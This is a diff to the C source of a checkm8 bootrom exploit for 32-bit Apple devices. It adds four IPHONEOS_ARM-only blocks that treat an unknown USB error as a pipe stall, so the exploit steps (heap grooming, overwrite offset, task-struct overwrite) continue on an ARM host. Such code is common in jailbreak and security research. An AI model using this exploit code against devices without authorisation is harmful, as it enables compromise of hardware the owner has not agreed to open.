@@ -128,6 +128,12 @@ int checkm8_32_exploit(irecv_client_t client, irecv_device_t device_info, const 
     
     DEBUG_("\x1b[36mGrooming heap\x1b[39m\n");
     r = usb_req_stall(client);
+#ifdef IPHONEOS_ARM
+    /* fucking pipe */
+    if(r == IRECV_E_UNKNOWN_ERROR){
+        r = IRECV_E_PIPE;
+    }
+#endif
     if(r != IRECV_E_PIPE) {
         printf("\x1b[31mERROR: Failed to stall pipe.\x1b[39m\n");
         return -1;
@@ -276,6 +282,12 @@ int checkm8_32_exploit(irecv_client_t client, irecv_device_t device_info, const 
     DEBUG_("\x1b[37mnew offset: %x\x1b[39m\n", overwriteOff);
     DEBUG_("\x1b[36mpushing forward overwrite offset\x1b[39m\n");
     r = irecv_usb_control_transfer(client, 0, 0, 0, 0, buf, overwriteOff, overwriteTimeout);
+#ifdef IPHONEOS_ARM
+    /* fucking pipe */
+    if(r == IRECV_E_UNKNOWN_ERROR){
+        r = IRECV_E_PIPE;
+    }
+#endif
     if(r != IRECV_E_PIPE) {
         printf("\x1b[31mERROR: Failed to push forward overwrite offset.\x1b[39m\n");
         return -1;
@@ -306,6 +318,12 @@ int checkm8_32_exploit(irecv_client_t client, irecv_device_t device_info, const 
     
     DEBUG_("\x1b[36mGrooming heap\x1b[39m\n");
     r = usb_req_stall(client);
+#ifdef IPHONEOS_ARM
+    /* fucking pipe */
+    if(r == IRECV_E_UNKNOWN_ERROR){
+        r = IRECV_E_PIPE;
+    }
+#endif
     if(r != IRECV_E_PIPE) {
         printf("\x1b[31mERROR: Failed to stall pipe.\x1b[39m\n");
         return -1;
@@ -319,6 +337,12 @@ int checkm8_32_exploit(irecv_client_t client, irecv_device_t device_info, const 
     DEBUG_("\x1b[36mOverwriting task struct\x1b[39m\n");
     
     r = irecv_usb_control_transfer(client, 0, 0, 0, 0, config.overwrite, config.overwrite_len, 100);
+#ifdef IPHONEOS_ARM
+    /* fucking pipe */
+    if(r == IRECV_E_UNKNOWN_ERROR){
+        r = IRECV_E_PIPE;
+    }
+#endif
     if(r != IRECV_E_PIPE) {
         printf("\x1b[31mERROR: Failed to overwrite task.\x1b[39m\n");
         return -1;
